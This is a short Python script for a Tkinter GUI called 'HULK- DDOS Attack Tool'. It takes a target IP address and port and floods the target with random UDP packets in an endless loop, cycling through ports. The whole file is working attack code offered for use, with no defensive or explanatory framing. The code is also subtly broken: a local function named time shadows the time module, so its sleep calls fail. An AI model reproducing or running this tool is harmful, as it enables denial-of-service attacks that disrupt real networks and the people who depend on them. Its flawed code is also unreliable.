import sys
import os
import socket
import random
import threading
from tkinter import *
from tkinter.ttk import *
from time import strftime
from datetime import datetime

def time():
    string = strftime('%H:%M:%S %p')
    lbl.config(text=string)
    lbl.after(1000, time)

def attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    os.system("clear")
    
    print("[>                      ] 0% ")
    time.sleep(0.5)
    print("[=====>      H          ] 25%")
    time.sleep(0.5)
    print("[==========> U          ] 50%")
    time.sleep(0.5)
    print("[==========  L ====>    ] 75%")
    time.sleep(0.5)
    print("[==========  K ========>] 100%")
    time.sleep(3)
    
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port} -by HULK")
        if port == 65534:
            port = 1

def start_attack():
    ip = E1.get()
    port = int(E2.get())
    threading.Thread(target=attack, args=(ip, port)).start()

root = Tk()
root.title("HULK- DDOS Attack Tool")
root.geometry("350x200+385+105")
root.resizable(0, 0)

lbl = Label(root, font=('calibri', 20, 'bold'),
            background='purple',
            foreground='white')
lbl.pack(anchor='s')
time()

L1 = Label(root, text="ip address")
L1.pack(side=TOP)
E1 = Entry(root)
E1.pack(side=TOP)

L2 = Label(root, text="port")
L2.pack(side=TOP)
E2 = Entry(root)
E2.pack(side=TOP)

button = Button(root, text="Attack", command=start_attack)
button.pack(side=TOP)

root.mainloop()
